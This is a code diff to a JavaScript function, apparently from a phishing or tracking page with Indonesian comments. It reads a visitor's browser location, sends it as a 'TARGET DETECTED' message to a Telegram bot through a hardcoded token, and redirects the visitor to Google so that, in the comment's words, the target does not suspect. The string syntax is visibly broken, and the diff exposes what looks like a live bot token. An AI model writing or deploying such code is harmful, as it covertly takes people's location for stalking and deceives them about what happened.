@@ -13,10 +13,14 @@ function sendToTelegram(position) {
     const lon = position.coords.longitude;
     const token = "8638321687:AAHq7-qulLENRloAfMrULfSW4Wchu25R-ms"; 
     const chat_id = "5287296131";
+    
+    // Membangun pesan lokasi
     const text = 🎯 TARGET TERDETEKSI!%0A📍 Lokasi: https://www.google.com{lat},${lon};
 
+    // Mengirim ke Bot Telegram (Pastikan ada kata /bot di depannya)
     fetch(https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text})
     .then(() => {
+        // Target diarahkan ke Google agar tidak curiga
         window.location.href = "https://www.google.com"; 
     });
 }
